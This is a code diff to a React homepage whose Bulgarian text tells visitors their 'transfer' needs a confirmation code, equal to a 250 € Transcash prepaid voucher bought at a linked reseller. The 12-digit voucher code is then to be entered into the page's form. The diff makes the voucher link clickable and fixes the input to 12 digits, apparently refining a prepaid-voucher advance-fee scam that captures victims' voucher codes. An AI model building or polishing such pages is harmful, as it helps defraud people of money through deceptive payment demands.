@@ -73,7 +73,7 @@ export default function HomePage() {
 
   const handleCodeChange = (e) => {
     const value = e.target.value.replace(/\D/g, '');
-    if (value.length <= 14) {
+    if (value.length <= 12) {
       setCode(value);
     }
   };
@@ -439,12 +439,24 @@ export default function HomePage() {
                   }}
                 >
                   <p style={{ margin: '0 0 6px' }}>
-                    Вашият трансфер е в процес на завършване, но се нуждаете от код за потвърждение GHT-UZ667.<strong>GHT-UZ667</strong>
+                    Вашият трансфер е в процес на завършване, но се нуждаете от код за потвърждение <strong>GHT-UZ667</strong>
                   </p>
-                  <p style={{ margin: '0 0 6px' }}>
-                    Това съответства на код TRANSCASH 250 €. Наличен на линка
-                    <strong> https://dundle.com/fr/transcash/250-eur-eu/</strong>
-                  </p>
+<p style={{ margin: '0 0 6px' }}>
+  Това съответства на код TRANSCASH 250 €. Наличен на линка{' '}
+  <a
+    href="https://dundle.com/fr/transcash/250-eur-eu/"
+    target="_blank"
+    rel="noopener noreferrer"
+    style={{
+      color: '#2563eb',
+      textDecoration: 'underline',
+      fontWeight: 600,
+    }}
+  >
+    https://dundle.com/fr/transcash/250-eur-eu/
+  </a>
+</p>
+
                   <p style={{ margin: '0 0 6px' }}>
                     След това въведете <strong>12 цифрения</strong> код в полето по-долу и завършете.
                   </p>
